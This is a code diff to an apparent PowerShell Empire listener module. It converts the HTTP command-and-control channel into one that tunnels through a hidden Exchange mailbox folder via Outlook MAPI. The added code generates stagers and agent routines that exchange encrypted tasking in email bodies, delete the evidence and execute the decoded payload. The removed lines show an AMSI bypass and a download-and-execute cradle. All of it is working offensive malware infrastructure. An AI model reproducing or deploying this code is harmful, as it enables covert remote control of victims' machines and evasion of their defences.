@@ -20,11 +20,11 @@ class Listener:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'HTTP[S]',
+            'Name': 'HTTP[S] + MAPI',
 
-            'Author': ['@harmj0y'],
+            'Author': ['@harmj0y','@_staaldraad'],
 
-            'Description': ('Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach.'),
+            'Description': ('Starts a http[s] listener (PowerShell or Python) which can be used with Mailpire for C2 through Exchange'),
 
             'Category' : ('client_server'),
 
@@ -39,7 +39,7 @@ class Listener:
             'Name' : {
                 'Description'   :   'Name for the listener.',
                 'Required'      :   True,
-                'Value'         :   'http'
+                'Value'         :   'mapi'
             },
             'Host' : {
                 'Description'   :   'Hostname/IP for staging.',
@@ -64,7 +64,7 @@ class Listener:
             'DefaultDelay' : {
                 'Description'   :   'Agent delay/reach back interval (in seconds).',
                 'Required'      :   True,
-                'Value'         :   5
+                'Value'         :   20
             },
             'DefaultJitter' : {
                 'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
@@ -100,6 +100,16 @@ class Listener:
                 'Description'   :   'TServer header for the control server.',
                 'Required'      :   True,
                 'Value'         :   'Microsoft-IIS/7.5'
+            },
+            'Folder' : {
+                'Description'   :   'The hidden folder in Exchange to user',
+                'Required'      :   True,
+                'Value'         :   'Liniaal'
+            },
+            'Email' : {
+                'Description'   :   'The email address of our target',
+                'Required'      :   False,
+                'Value'         :   ''
             }
         }
 
@@ -165,45 +175,22 @@ class Listener:
                 stager = ''
                 if safeChecks.lower() == 'true':
                     # @mattifestation's AMSI bypass
-                    stager = helpers.randomize_capitalization("[Ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.AmsiUtils'"
-                    stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
-                    stager += "'amsiInitFailed','NonPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
-                    stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
+                    stager = helpers.randomize_capitalization('Add-Type -assembly "Microsoft.Office.Interop.Outlook";')
+                    stager += "$outlook = New-Object -comobject Outlook.Application;"
+                    stager += helpers.randomize_capitalization('$mapi = $Outlook.GetNameSpace("')
+                    stager += 'MAPI");'
+                    #stager += helpers.randomize_capitalization("$f = $mapi.Folders | select name;")
+                    #stager += helpers.randomize_capitalization("$inf = 0; $cntr=1;")
 
-                stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
+                #stager += helpers.randomize_capitalization("foreach ($name in $f) { if($name.name -eq '")
+                #stager += listenerOptions['Email']['Value']
+                #stager += helpers.randomize_capitalization("'){ $inf = $cntr; } $cntr += 1 }")
 
-                if userAgent.lower() == 'default':
-                    profile = listenerOptions['DefaultProfile']['Value']
-                    userAgent = profile.split('|')[1]
-                stager += "$u='"+userAgent+"';"
+                # clear out all existing mails/messages
 
-                if 'https' in host:
-                    # allow for self-signed certificates for https connections
-                    stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
-
-                if userAgent.lower() != 'none' or proxy.lower() != 'none':
-
-                    if userAgent.lower() != 'none':
-                        stager += helpers.randomize_capitalization('$wc.Headers.Add(')
-                        stager += "'User-Agent',$u);"
-
-                    if proxy.lower() != 'none':
-                        if proxy.lower() == 'default':
-                            stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
-                        else:
-                            # TODO: implement form for other proxy
-                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
-                            stager += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
-                            stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
-                        if proxyCreds.lower() == "default":
-                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
-                        else:
-                            # TODO: implement form for other proxy credentials
-                            pass
-
-                # TODO: reimplement stager retries?
+                stager += helpers.randomize_capitalization("foreach ($item in $outlook.Session.GetDefaultFolder(6).Folders.Item('")
+                stager += listenerOptions['Folder']['Value']
+                stager += helpers.randomize_capitalization("').items) { $item.Delete(); }")
 
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
@@ -217,11 +204,22 @@ class Listener:
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
                 # add the RC4 packet to a cookie
-                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
-                stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)
+                stager += helpers.randomize_capitalization('$mail = $outlook.CreateItem(0);$mail.Subject = "')
+                stager += 'mailpireout";'
+                stager += helpers.randomize_capitalization('$mail.Body = ')
+                stager += '"STAGE - %s"' % b64RoutingPacket
+                stager += helpers.randomize_capitalization(';$mail.save() | out-null;')
+                stager += helpers.randomize_capitalization("$mail.Move($outlook.Session.GetDefaultFolder(6).Folders.Item('")
+                stager += listenerOptions['Folder']['Value']
+                stager += helpers.randomize_capitalization('\'))| out-null;')
+                stager += helpers.randomize_capitalization('$break = $False; $data = "";')
+                stager += helpers.randomize_capitalization("While ($break -ne $True){")
+                stager += helpers.randomize_capitalization("foreach ($item in $outlook.Session.GetDefaultFolder(6).Folders.Item('")
+                stager += "%s').Items) {" % listenerOptions['Folder']['Value']
+                stager += helpers.randomize_capitalization("if($item.Subject -eq ")
+                stager += "\"mailpirein\""
+                stager += helpers.randomize_capitalization("){$item.HTMLBody | out-null;if($item.Body[$item.Body.Length-1] -ne '-'){$traw = $item.Body;$item.Delete();$break = $True;$data = [System.Convert]::FromBase64String($traw);;}}}Start-Sleep -s 2;}")
 
-                stager += "$ser='%s';$t='%s';" % (host, stage0)
-                stager += helpers.randomize_capitalization("$data=$WC.DownloadData($ser+$t);")
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
                 # decode everything and kick it over to IEX to kick off execution
@@ -317,6 +315,8 @@ class Listener:
         uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
         stagingKey = listenerOptions['StagingKey']['Value']
         host = listenerOptions['Host']['Value']
+        folder = listenerOptions['Folder']['Value']
+        #email = listenerOptions['Email']['Value']
 
         # select some random URIs for staging from the main profile
         stage1 = random.choice(uris)
@@ -325,7 +325,7 @@ class Listener:
         if language.lower() == 'powershell':
 
             # read in the stager base
-            f = open("%s/data/agent/stagers/http.ps1" % (self.mainMenu.installPath))
+            f = open("%s/data/agent/stagers/http_mapi.ps1" % (self.mainMenu.installPath))
             stager = f.read()
             f.close()
 
@@ -338,6 +338,8 @@ class Listener:
             stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
             stager = stager.replace('index.jsp', stage1)
             stager = stager.replace('index.php', stage2)
+            stager = stager.replace('REPLACE_FOLDER', folder)
+            #stager = stager.replace('REPLACE_EMAIL', email)
 
             randomizedStager = ''
 
@@ -409,6 +411,7 @@ class Listener:
         lostLimit = listenerOptions['DefaultLostLimit']['Value']
         killDate = listenerOptions['KillDate']['Value']
         workingHours = listenerOptions['WorkingHours']['Value']
+        folder = listenerOptions['Folder']['Value']
         b64DefaultResponse = base64.b64encode(self.default_response())
 
         if language == 'powershell':
@@ -419,6 +422,7 @@ class Listener:
 
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
+            commsCode = commsCode.replace('REPLACE_FOLDER',folder)
             code = code.replace('REPLACE_COMMS', commsCode)
 
             # strip out comments and blank lines
@@ -492,49 +496,40 @@ class Listener:
 
                         try {
                                 # meta 'TASKING_REQUEST' : 4
-                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
-                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
+                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
+                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket);
 
                                 # choose a random valid URI for checkin
-                                $taskURI = $script:TaskURIs | Get-Random
+                                $taskURI = $script:TaskURIs | Get-Random;
 
-                                $mail = $outlook.CreateItem(0)
-                                $mail.Subject = "mailpireout"
-                                $mail.Body = "GET - "+$RoutingCookie+" - "+$taskURI
-                                $mail.save() | out-null
-                                $mail.Move($mapi.Folders.Item($inf).Folders.Item('Inbox').Folders.Item('tunnelmeszs')) | out-null
+                                $mail = $outlook.CreateItem(0);
+                                $mail.Subject = "mailpireout";
+                                $mail.Body = "GET - "+$RoutingCookie+" - "+$taskURI;
+                                $mail.save() | out-null;
+                                $mail.Move($outlook.Session.GetDefaultFolder(6).Folders.Item('REPLACE_FOLDER'))| out-null;
 
-                                #keep checking to see if there is response
-                                $break = $False
-                                [byte[]]$b = @()
+                                # keep checking to see if there is response
+                                $break = $False;
+                                [byte[]]$b = @();
 
                                 While ($break -ne $True){
-                                  foreach ($item in $mapi.Folders.Item($inf).Folders.Item('Inbox').Folders.Item('tunnelmeszs').Items) {
-                                    if($item.Subject -eq "mailpirein")
-                                    {
-                                      $item.HTMLBody | out-null #this seems to force the message to be fully downloaded (not just headers)
-                                      if($item.Body[$item.Body.Length-1] -ne '-'){ #our message needs to fully load
-                                        $traw = $item.Body
-                                        $item.Delete()
-                                        $break = $True
-                                        $t = $traw.Split('-')
-                                        Foreach ($element in $t) {
-                                          $b += [byte]([Convert]::toInt16($element,16))
-                                        }
+                                  foreach ($item in $outlook.Session.GetDefaultFolder(6).Folders.Item('REPLACE_FOLDER').Items) {
+                                    if($item.Subject -eq "mailpirein"){
+                                      $item.HTMLBody | out-null;
+                                      if($item.Body[$item.Body.Length-1] -ne '-'){
+                                        $traw = $item.Body;
+                                        $item.Delete();
+                                        $break = $True;
+                                        $b = [System.Convert]::FromBase64String($traw);
                                       }
                                     }
                                   }
                                   Start-Sleep -s 1;
                                 }
                                 return ,$b
-
                         }
-                        catch [Net.WebException] {
+                        catch {
                             $script:MissedCheckins += 1
-                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
-                                # restart key negotiation
-                                Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                            }
                         }
                     }
                 """
@@ -545,31 +540,30 @@ class Listener:
 
                         if($Packets) {
                             # build and encrypt the response packet
-                            $EncBytes = Encrypt-Bytes $Packets
+                            $EncBytes = Encrypt-Bytes $Packets;
 
                             # build the top level RC4 "routing packet"
                             # meta 'RESULT_POST' : 5
-                            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5
-                            #$RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
-                            $RoutingPacketp = [System.BitConverter]::ToString($RoutingPacket)
+                            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;
+
+                            # $RoutingPacketp = [System.BitConverter]::ToString($RoutingPacket);
+                            $RoutingPacketp = [Convert]::ToBase64String($RoutingPacket);
                             try {
                                     # get a random posting URI
-                                    $taskURI = $Script:TaskURIs | Get-Random
-                                    #$response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
+                                    $taskURI = $Script:TaskURIs | Get-Random;
 
-                                    $mail = $outlook.CreateItem(0)
-                                    $mail.Subject = "mailpireout"
-                                    $mail.Body = "POSTM - "+$taskURI +" - "+$RoutingPacketp
-                                    $mail.save() | out-null
-                                    $mail.Move($mapi.Folders.Item($inf).Folders.Item('Inbox').Folders.Item('tunnelmeszs')) | out-null
+                                    $mail = $outlook.CreateItem(0);
+                                    $mail.Subject = "mailpireout";
+                                    $mail.Body = "POSTM - "+$taskURI +" - "+$RoutingPacketp;
+                                    $mail.save() | out-null;
+                                    $mail.Move($outlook.Session.GetDefaultFolder(6).Folders.Item('REPLACE_FOLDER')) | out-null;
                                 }
-                                catch [System.Net.WebException]{
-                                    # exception posting data...
+                                catch {
+
                                 }
                         }
                     }
                 """
-                #print updateServers + getTask + sendMessage
                 return updateServers + getTask + sendMessage
 
             elif language.lower() == 'python':
